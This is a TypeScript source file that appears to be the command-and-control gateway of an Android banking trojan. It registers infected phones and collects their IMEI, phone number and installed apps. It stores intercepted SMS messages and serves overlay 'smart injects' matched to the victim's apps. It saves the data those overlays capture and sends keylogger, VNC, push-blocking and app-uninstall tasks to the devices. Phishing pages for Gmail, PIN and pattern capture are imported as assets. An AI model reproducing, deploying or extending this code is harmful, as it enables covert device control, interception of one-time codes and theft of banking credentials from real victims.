// api/src/bot-api/gateway.ts
import { SupabaseClient } from '@supabase/supabase-js';
import {
  P_ACTION_REGISTER,
  P_ACTION_PING,
  P_ACTION_SMS,
  P_ACTION_VNC_SCREENSHOT,
  P_ACTION_SMART_INJECT,
  P_ACTION_SMART_SAVE,
  P_BOT_ID,
  P_TAG,
  P_IS_DEVICE_ADMIN,
  P_IS_LOCKED,
  P_IS_SMS_ADMIN,
  P_ACTION,
  P_IMEI,
  P_NUMBER,
  P_COUNTRY,
  P_LANG,
  P_ANDROID,
  P_MODEL,
  P_OPERATOR,
  P_INSTALLED_APPS,
  P_UPTIME,
  P_VNC,
  P_IS_LOADER_INSTALLED,
  P_REAL_IP,
  P_INFO_ACSB,
  P_INFO_PUSH,
  P_INFO_BATTERY,
  P_INFO_CHARGER,
  P_INFO_SCREEN,
  P_IS_GO,
  P_INFO_SUPRESSED,
  P_INFO_PERMS_FAILED,
  P_LOCAL_TIMESTAMP,
  P_TASK,
  P_KEYLOGGER,
  P_SMART_PKG,
  P_SMART_DATA,
  P_SMART_FILLED,
  P_ADDRESS,
  P_BODY,
  P_TIME,
  P_TASKS_RESULTS,
} from '../shared/constants';
import {
  apps2array,
  isValidBotId,
  getIp,
  package_list_to_array,
} from '../shared/utils';
import type { Task } from '../shared/types';

// --- Imports de assets estáticos (substitui loadStaticFileCached) ---
import avsList from '../assets/avs_list.txt?raw';
import pushBlockedList from '../assets/push_blocked_list.txt?raw';
import expiresContent from '../assets/expires?raw';
import gmailHtml from '../assets/gmail.html?raw';
import patternHtml from '../assets/pattern.html?raw';
import pinHtml from '../assets/pin.html?raw';

interface BotApiData {
  [key: string]: any;
}

export class Gate {
  private supabase: SupabaseClient;
  private cfg: Record<string, string>;
  private bot_id: string = '';
  private request?: Request;

  constructor(supabase: SupabaseClient, cfg: Record<string, string>) {
    this.supabase = supabase;
    this.cfg = cfg;
  }

  async process(data: BotApiData, request?: Request): Promise<string> {
    try {
      this.request = request;

      // ===== LOG PARA DEPURAÇÃO =====
      console.log('📦 Dados recebidos (raw):', JSON.stringify(data, null, 2));
      // ===============================

      const bot_id = data[P_BOT_ID];
      if (!isValidBotId(String(bot_id ?? ''))) {
        return this.json_response('er1');
      }
      this.bot_id = bot_id;

      if (data[P_TAG] === undefined || data[P_TAG] === '') {
        return this.json_response('er2');
      }
      if (data[P_IS_DEVICE_ADMIN] === undefined || data[P_IS_DEVICE_ADMIN] === '') {
        return this.json_response('er3');
      }
      if (data[P_IS_LOCKED] === undefined || data[P_IS_LOCKED] === '') {
        return this.json_response('er4');
      }
      if (data[P_IS_SMS_ADMIN] === undefined || data[P_IS_SMS_ADMIN] === '') {
        return this.json_response('er5');
      }

      const action = data[P_ACTION];
      const allowed = [
        P_ACTION_REGISTER,
        P_ACTION_PING,
        P_ACTION_SMS,
        P_ACTION_VNC_SCREENSHOT,
        P_ACTION_SMART_INJECT,
        P_ACTION_SMART_SAVE,
      ];
      if (
        action === undefined ||
        action === '' ||
        !allowed.includes(Number(action))
      ) {
        return this.json_response('er6');
      }

      switch (Number(action)) {
        case P_ACTION_REGISTER:
          return await this.register(bot_id, data);
        case P_ACTION_PING:
          return await this.ping(bot_id, data);
        case P_ACTION_SMS:
          return await this.save_sms(bot_id, data);
        case P_ACTION_VNC_SCREENSHOT:
          return await this.save_vnc_screenshot(bot_id, data);
        case P_ACTION_SMART_INJECT:
          return await this.get_smart_injects(bot_id, data);
        case P_ACTION_SMART_SAVE:
          return await this.save_smart_inject(bot_id, data);
        default:
          return this.json_response('');
      }
    } catch (err) {
      console.error('gateway.process error:', err);
      return JSON.stringify({
        status: 'error',
        message: err instanceof Error ? err.message : String(err),
      });
    }
  }

  private async checkExpiration(): Promise<string | null> {
    try {
      if (expiresContent) {
        const expireDate = new Date(expiresContent.trim());
        if (!isNaN(expireDate.getTime()) && expireDate < new Date()) {
          return 'EXPIRED';
        }
      }
    } catch {
      /* conteúdo vazio ou inválido → ignora */
    }
    return null;
  }

  private async register(bot_id: string, data: BotApiData): Promise<string> {
    try {
      const expired = await this.checkExpiration();
      if (expired) return this.json_response(expired);

      const is_sms_admin = Number(data[P_IS_SMS_ADMIN]) || 0;
      const is_device_admin = Number(data[P_IS_DEVICE_ADMIN]) || 0;
      const is_locked = Number(data[P_IS_LOCKED]) || 0;
      const is_loader_installed =
        data[P_IS_LOADER_INSTALLED] !== undefined
          ? Number(data[P_IS_LOADER_INSTALLED])
          : 2;

      const extraInfoJson = this.getExtraInfo(data);

      let ip_raw: string;
      if (data[P_REAL_IP] && data[P_REAL_IP] !== '') {
        ip_raw = this.parseIP(String(data[P_REAL_IP]));
      } else {
        ip_raw = this.request ? getIp(this.request) : '';
      }
      const ip = ip_raw.substring(0, 512);
      const imei = String(data[P_IMEI] || '').substring(0, 50);
      const number = String(data[P_NUMBER] || '').substring(0, 15);
      const country = String(data[P_COUNTRY] || '').substring(0, 2);
      const lang = String(data[P_LANG] || '').substring(0, 5);
      const android = String(data[P_ANDROID] || '').substring(0, 64);
      const model = String(data[P_MODEL] || '').substring(0, 200);
      const operator = String(data[P_OPERATOR] || '').substring(0, 20);
      const tag = String(data[P_TAG] || '').substring(0, 32);
      const apps = String(data[P_INSTALLED_APPS] || '');
      const uptime = Number(data[P_UPTIME]) || 0;
      const vnc = String(data[P_VNC] || '').substring(0, 128);
      const keylogger = this.cfg['keylogger_enabled'] || '0';

      const { data: existingBot, error: selectError } = await this.supabase
        .from('bots')
        .select('id')
        .eq('bot_id', bot_id)
        .maybeSingle();

      if (selectError) {
        console.error('register select error:', selectError);
        return this.json_response('db_error');
      }

      const botRecord: Record<string, any> = {
        bot_id,
        imei,
        number,
        is_device_admin: Boolean(is_device_admin),
        is_sms_admin: Boolean(is_sms_admin),
        is_locked: Boolean(is_locked),
        registered: new Date().toISOString(),
        last_seen: new Date().toISOString(),
        ip,
        country,
        lang,
        android,
        model,
        operator,
        tag,
        apps,
        is_loader_installed: Boolean(is_loader_installed),
        extra_info_json: extraInfoJson,
        uptime,
        keylogger: Boolean(Number(keylogger)),
        vnc,
        is_fg: Boolean(data[P_IS_GO]),
      };

      if (existingBot) {
        const { error: updateError } = await this.supabase
          .from('bots')
          .update(botRecord)
          .eq('bot_id', bot_id);
        if (updateError) {
          console.error('register update error:', updateError);
          return this.json_response('db_error');
        }
      } else {
        const { error: insertError } = await this.supabase
          .from('bots')
          .insert(botRecord);
        if (insertError) {
          console.error('register insert error:', insertError);
          return this.json_response('db_error');
        }
      }

      if (data[P_IS_GO]) {
        await this.supabase.from('bots_tasks').insert({
          bot_id,
          task_type: 'start_fg',
          data: 'true',
          status: 'waiting',
        });
      }

      return await this.json_response('OK REG_SUCCESS', true);
    } catch (err) {
      console.error('register error:', err);
      return JSON.stringify({
        status: 'error',
        message: err instanceof Error ? err.message : String(err),
      });
    }
  }

  private async ping(bot_id: string, data: BotApiData): Promise<string> {
    try {
      const expired = await this.checkExpiration();
      if (expired) return this.json_response(expired);

      const { data: bot, error: selectError } = await this.supabase
        .from('bots')
        .select('*')
        .eq('bot_id', bot_id)
        .maybeSingle();

      if (selectError) {
        console.error('ping select error:', selectError);
        return this.json_response('db_error');
      }

      if (!bot) {
        const defaultData: BotApiData = {
          ...data,
          [P_IMEI]: '000000000',
          [P_NUMBER]: '',
          [P_COUNTRY]: '',
          [P_LANG]: '',
          [P_ANDROID]: 'unknown',
          [P_MODEL]: '',
          [P_OPERATOR]: '',
          [P_TAG]: data[P_TAG] || 'olds',
          [P_UPTIME]: '0',
          [P_KEYLOGGER]: this.cfg['keylogger_enabled'] || '0',
          [P_VNC]: '',
        };
        const regResponse = await this.register(bot_id, defaultData);

        const { data: existingTasks } = await this.supabase
          .from('bots_tasks')
          .select('id')
          .eq('bot_id', bot_id)
          .eq('task_type', 'register_again');

        if (!existingTasks || existingTasks.length === 0) {
          await this.supabase.from('bots_tasks').insert({
            bot_id,
            task_type: 'register_again',
            data: '',
            status: 'waiting',
          });
        }
        return regResponse;
      }

      let ip_raw: string;
      if (data[P_REAL_IP] && data[P_REAL_IP] !== '') {
        ip_raw = this.parseIP(String(data[P_REAL_IP]));
      } else {
        ip_raw = this.request ? getIp(this.request) : '';
      }
      const ip = ip_raw.substring(0, 512);

      const updates: Record<string, any> = {
        last_seen: new Date().toISOString(),
        ip,
        is_sms_admin: Boolean(Number(data[P_IS_SMS_ADMIN]) || 0),
        is_device_admin: Boolean(Number(data[P_IS_DEVICE_ADMIN]) || 0),
        is_locked: Boolean(Number(data[P_IS_LOCKED]) || 0),
        is_loader_installed:
          data[P_IS_LOADER_INSTALLED] !== undefined
            ? Boolean(Number(data[P_IS_LOADER_INSTALLED]))
            : true,
        extra_info_json: this.getExtraInfo(data),
        uptime: Number(data[P_UPTIME]) || 0,
      };

      if (data[P_IMEI] !== undefined)
        updates.imei = String(data[P_IMEI] || '').substring(0, 50);
      if (data[P_NUMBER] !== undefined)
        updates.number = String(data[P_NUMBER] || '').substring(0, 15);
      if (data[P_INSTALLED_APPS] !== undefined)
        updates.apps = data[P_INSTALLED_APPS];
      if (data[P_LANG] !== undefined)
        updates.lang = String(data[P_LANG] || '').substring(0, 5);
      if (data[P_COUNTRY] !== undefined)
        updates.country = String(data[P_COUNTRY] || '').substring(0, 2);
      if (data[P_ANDROID] !== undefined)
        updates.android = String(data[P_ANDROID] || '').substring(0, 64);
      if (data[P_MODEL] !== undefined)
        updates.model = String(data[P_MODEL] || '').substring(0, 200);
      if (data[P_OPERATOR] !== undefined)
        updates.operator = String(data[P_OPERATOR] || '').substring(0, 20);
      if (data[P_TAG] !== undefined)
        updates.tag = String(data[P_TAG] || '').substring(0, 32);
      if (data[P_VNC] !== undefined)
        updates.vnc = String(data[P_VNC] || '').substring(0, 128);
      if (data[P_KEYLOGGER] !== undefined)
        updates.keylogger = Boolean(Number(data[P_KEYLOGGER]));
      if (data[P_IS_GO] !== undefined)
        updates.is_fg = Boolean(data[P_IS_GO]);

      const { error: updateError } = await this.supabase
        .from('bots')
        .update(updates)
        .eq('bot_id', bot_id);

      if (updateError) {
        console.error('ping update error:', updateError);
        return this.json_response('db_error');
      }

      const tasksResults = data[P_TASKS_RESULTS];
      if (Array.isArray(tasksResults)) {
        await this.save_tasks_results(bot_id, tasksResults);
      }

      return await this.json_response('OK');
    } catch (err) {
      console.error('ping error:', err);
      return JSON.stringify({
        status: 'error',
        message: err instanceof Error ? err.message : String(err),
      });
    }
  }

  private async save_sms(bot_id: string, data: BotApiData): Promise<string> {
    try {
      const address = data[P_ADDRESS] || '';
      const body = data[P_BODY] || '';
      const time = data[P_TIME] || '';
      if (!address || !body || !time) {
        return this.json_response('bad_sms');
      }

      const { data: existing } = await this.supabase
        .from('sms')
        .select('id')
        .eq('bot_id', bot_id)
        .eq('time', time)
        .maybeSingle();

      if (!existing) {
        const { error: insertError } = await this.supabase.from('sms').insert({
          bot_id,
          number: address,
          time,
          msg: body,
        });
        if (insertError) {
          console.error('save_sms insert error:', insertError);
          return this.json_response('db_error');
        }
      }
      return this.json_response(`SMS_OK_${time}`);
    } catch (err) {
      console.error('save_sms error:', err);
      return JSON.stringify({
        status: 'error',
        message: err instanceof Error ? err.message : String(err),
      });
    }
  }

  private async save_vnc_screenshot(
    _bot_id: string,
    _data: BotApiData
  ): Promise<string> {
    return this.json_response('VNC_SHOT_OK');
  }

  private async get_smart_injects(
    bot_id: string,
    _data: BotApiData
  ): Promise<string> {
    try {
      const injects = await this.api_get_injects(bot_id);
      return this.json_response({ smarts: injects });
    } catch (err) {
      console.error('get_smart_injects error:', err);
      return JSON.stringify({
        status: 'error',
        message: err instanceof Error ? err.message : String(err),
      });
    }
  }

  private async save_smart_inject(
    bot_id: string,
    data: BotApiData
  ): Promise<string> {
    try {
      const pkg = data[P_SMART_PKG];
      const smData = data[P_SMART_DATA];
      const filled = data[P_SMART_FILLED];
      if (pkg && smData) {
        await this.api_save_data(bot_id, pkg, smData);
        if (filled) {
          await this.disable_smart_for_bot(bot_id, pkg);
        }
      }
      return this.json_response('SMART_SAVED');
    } catch (err) {
      console.error('save_smart_inject error:', err);
      return JSON.stringify({
        status: 'error',
        message: err instanceof Error ? err.message : String(err),
      });
    }
  }

  async api_get_injects(bot_id: string): Promise<any[]> {
    try {
      const { data: bot } = await this.supabase
        .from('bots')
        .select('apps')
        .eq('bot_id', bot_id)
        .maybeSingle();
      if (!bot || !bot.apps) return [];

      const appsArr = apps2array(bot.apps);
      if (appsArr.length === 0) return [];

      const { data: smartsForApps } = await this.supabase
        .from('smarts')
        .select('stype, package, data, cap_data, icon, is_active')
        .in('package', appsArr);

      const { data: specials } = await this.supabase
        .from('smarts')
        .select('stype, package, data, cap_data, icon, is_active')
        .eq('sgroup', 'specials');

      const { data: disabledRows } = await this.supabase
        .from('smarts_bots')
        .select('smart_id')
        .eq('bot_id', bot_id)
        .eq('is_active', false);

      let disabledPkgs: string[] = [];
      if (disabledRows && disabledRows.length > 0) {
        const smartIds = disabledRows.map((r) => r.smart_id);
        const { data: disabledSmarts } = await this.supabase
          .from('smarts')
          .select('package')
          .in('id', smartIds);
        if (disabledSmarts) {
          disabledPkgs = disabledSmarts.map((s) => s.package);
        }
      }

      const allSmarts = [...(smartsForApps || []), ...(specials || [])];
      const injects: any[] = [];

      for (const row of allSmarts) {
        if (!row.package) continue;
        const isDisabled = disabledPkgs.includes(row.package);
        const isActive = Boolean(row.is_active) && !isDisabled;
        const capData = row.cap_data || '';
        const showCap = !isActive && capData !== '';

        const inj: any = {
          package: row.package,
          data: row.data || '',
          cap_data: capData,
          show_cap: showCap,
          is_active: isActive,
        };

        if (row.stype === 'html') {
          if (!isActive && capData === '') continue;
          inj.type = 'html';
          if (row.icon) {
            try {
              const bytes = new Uint8Array(row.icon as ArrayBuffer);
              let binary = '';
              for (let i = 0; i < bytes.length; i++) {
                binary += String.fromCharCode(bytes[i]);
              }
              inj.icon = btoa(binary);
            } catch {
              /* ignore */
            }
          }
        } else {
          if (!isActive) continue;
          inj.type = 'url';
        }
        injects.push(inj);
      }
      return injects;
    } catch (err) {
      console.error('api_get_injects error:', err);
      return [];
    }
  }

  async api_save_data(bot_id: string, pkg: string, data: string): Promise<void> {
    const { data: smart } = await this.supabase
      .from('smarts')
      .select('id')
      .eq('package', pkg)
      .maybeSingle();
    if (!smart) return;

    await this.supabase.from('smarts_data').insert({
      smart_id: smart.id,
      bot_id,
      time: Math.floor(Date.now() / 1000).toString(),
      data,
    });
  }

  async injects_to_enable(bot_id: string): Promise<string> {
    const { data: enabledRows } = await this.supabase
      .from('smarts_bots')
      .select('smart_id')
      .eq('bot_id', bot_id)
      .eq('is_active', true);
    if (!enabledRows || enabledRows.length === 0) return '';

    const { data: smarts } = await this.supabase
      .from('smarts')
      .select('package')
      .in(
        'id',
        enabledRows.map((r) => r.smart_id)
      );
    if (!smarts || smarts.length === 0) return '';
    return smarts.map((s) => s.package).join(',');
  }

  async injects_to_disable(bot_id: string): Promise<string> {
    const { data: disabledRows } = await this.supabase
      .from('smarts_bots')
      .select('smart_id')
      .eq('bot_id', bot_id)
      .eq('is_active', false);
    if (!disabledRows || disabledRows.length === 0) return '';

    const { data: smarts } = await this.supabase
      .from('smarts')
      .select('package')
      .in(
        'id',
        disabledRows.map((r) => r.smart_id)
      );
    if (!smarts || smarts.length === 0) return '';
    return smarts.map((s) => s.package).join(',');
  }

  private async disable_smart_for_bot(
    bot_id: string,
    pkg: string
  ): Promise<void> {
    const { data: smart } = await this.supabase
      .from('smarts')
      .select('id')
      .eq('package', pkg)
      .maybeSingle();
    if (!smart) return;

    await this.supabase.from('smarts_bots').upsert(
      { smart_id: smart.id, bot_id, is_active: false },
      { onConflict: 'smart_id,bot_id' }
    );
  }

  async get_new_tasks(bot_id: string): Promise<Task[]> {
    const { data: tasks } = await this.supabase
      .from('bots_tasks')
      .select('id, task_type, data')
      .eq('bot_id', bot_id)
      .eq('status', 'waiting');
    if (!tasks || tasks.length === 0) return [];

    await this.supabase
      .from('bots_tasks')
      .update({ status: 'in_process' })
      .in(
        'id',
        tasks.map((t) => t.id)
      );

    return tasks as Task[];
  }

  async save_tasks_results(bot_id: string, results: string[]): Promise<void> {
    if (!results || results.length === 0) return;
    for (const elem of results) {
      const [taskIdStr, value] = elem.split(':', 2);
      const taskId = Number(taskIdStr);
      if (!taskId || !value?.trim()) continue;
      await this.supabase
        .from('bots_tasks')
        .update({ status: value })
        .eq('id', taskId)
        .eq('bot_id', bot_id);
    }
  }

  async json_response(
    response: any,
    registration: boolean = false
  ): Promise<string> {
    try {
      const tasks = await this.get_new_tasks(this.bot_id);
      const arr: Record<string, any> = { response, tasks };

      arr['panel_smarts_ver'] = this.cfg['smarts_ver'] || '0';

      const enable = await this.injects_to_enable(this.bot_id);
      if (enable) arr['injects_to_enable'] = enable;
      const disable = await this.injects_to_disable(this.bot_id);
      if (disable) arr['injects_to_disable'] = disable;

      const domsStr = this.cfg['domains_bot'] || '';
      if (domsStr.trim() !== '') {
        const finalDoms = domsStr
          .split('|')
          .map((d) => d.trim())
          .filter((d) => d !== '')
          .map((d) => {
            if (!d.startsWith('https://')) d = 'https://' + d;
            if (!d.endsWith('/')) d += '/';
            return d;
          })
          .join('|');
        if (finalDoms) arr['extra_domains'] = finalDoms;
      }

      if (registration) {
        arr['block_push_apps'] = await this.blockPushApps();
        arr['minimize_apps'] = (this.cfg['minimize_apps'] || '').replace(
          /\n/g,
          ','
        );
        arr['uninstall_apps'] = (this.cfg['uninstall_apps'] || '').replace(
          /\n/g,
          ','
        );
        arr['block_push_delay'] = this.cfg['block_push_delay'] || '0';
        arr['minimize_delay'] = this.cfg['minimize_delay'] || '0';
        arr['uninstall_delay'] = this.cfg['uninstall_delay'] || '120';
        arr['get_device_admin_delay'] =
          this.cfg['get_device_admin_delay'] || '0';
        arr['keylogger_delay'] = this.cfg['keylogger_delay'] || '0';
        arr['injects_delay'] = this.cfg['injects_delay'] || '120';
        arr['keylogger_enabled'] = this.cfg['keylogger_enabled'] || '0';
      } else {
        const { data: bot } = await this.supabase
          .from('bots')
          .select('keylogger')
          .eq('bot_id', this.bot_id)
          .maybeSingle();
        arr['keylogger_enabled'] = bot ? bot.keylogger : '0';
      }

      arr['net_delay'] = this.cfg['net_delay'] || '60';

      const { data: vncTasks } = await this.supabase
        .from('vnc_tasks')
        .select('id, task_type, data')
        .eq('bot_id', this.bot_id);

      if (vncTasks && vncTasks.length > 0) {
        arr['vnc_tasks'] = vncTasks.map((t) => ({
          type: t.task_type,
          data: t.data,
        }));
        await this.supabase.from('vnc_tasks').delete().eq('bot_id', this.bot_id);
      }

      return JSON.stringify(arr);
    } catch (err) {
      console.error('json_response error:', err);
      return JSON.stringify({
        status: 'error',
        message: err instanceof Error ? err.message : String(err),
      });
    }
  }

  async blockPushApps(): Promise<string> {
    try {
      // Usa o import pushBlockedList em vez de loadStaticFileCached
      const blockStr = this.cfg['block_push_apps'] || '';
      const apps = package_list_to_array(blockStr);
      // Adiciona os da lista estática, se houver
      if (pushBlockedList.trim()) {
        const staticApps = package_list_to_array(pushBlockedList);
        for (const pkg of staticApps) apps.push(pkg);
      }
      const { data: disabled } = await this.supabase
        .from('pushes_bots')
        .select('pkg')
        .eq('bot_id', this.bot_id)
        .eq('enabled', false);
      if (disabled) {
        for (const d of disabled) apps.push(d.pkg);
      }
      return Array.from(new Set(apps)).join(',');
    } catch (err) {
      console.error('blockPushApps error:', err);
      return '';
    }
  }

  private getExtraInfo(data: BotApiData): string {
    const info: Record<string, any> = {};
    if (data[P_INFO_ACSB] !== undefined)
      info['HAS_ACSB'] = Number(data[P_INFO_ACSB]);
    if (data[P_INFO_PUSH] !== undefined)
      info['PUSH_ADMIN'] = Number(data[P_INFO_PUSH]);
    if (data[P_INFO_BATTERY] !== undefined)
      info['BATTERY_LEVEL'] = Number(data[P_INFO_BATTERY]);
    if (data[P_INFO_CHARGER] !== undefined)
      info['ON_CHARGER'] = Number(data[P_INFO_CHARGER]);
    if (data[P_INFO_SCREEN] !== undefined)
      info['SCREEN_UNLOCKED'] = Number(data[P_INFO_SCREEN]);
    if (data[P_IS_GO] !== undefined)
      info['IS_ANDROID_GO'] = Number(data[P_IS_GO]);
    if (data[P_INFO_SUPRESSED] !== undefined)
      info['P_INFO_SUPRESSED'] = Number(data[P_INFO_SUPRESSED]);
    if (data[P_INFO_PERMS_FAILED] !== undefined)
      info['P_INFO_PERMS_FAILED'] = String(
        data[P_INFO_PERMS_FAILED]
      ).substring(0, 512);
    if (data[P_LOCAL_TIMESTAMP] !== undefined)
      info['P_LOCAL_TIMESTAMP'] = String(data[P_LOCAL_TIMESTAMP]).substring(
        0,
        128
      );
    if (data[P_TASK] !== undefined)
      info['P_TASK'] = String(data[P_TASK]).substring(0, 128);
    return JSON.stringify(info);
  }

  private parseIP(ipJson: string): string {
    if (ipJson.includes('Sorry, but')) return 'ip_api.com/json parse error';
    const trimmed = ipJson.trim().replace(/<[^>]*>/g, '');
    if (!trimmed.startsWith('{')) return trimmed;
    try {
      const js = JSON.parse(trimmed);
      if (js && js.query) {
        let res = js.query + '<br />';
        for (const elem of ['country', 'regionName', 'city', 'isp']) {
          if (js[elem]) res += js[elem] + '; ';
        }
        return res.substring(0, res.length - 2);
      }
    } catch {
      /* ignore */
    }
    return trimmed;
  }
}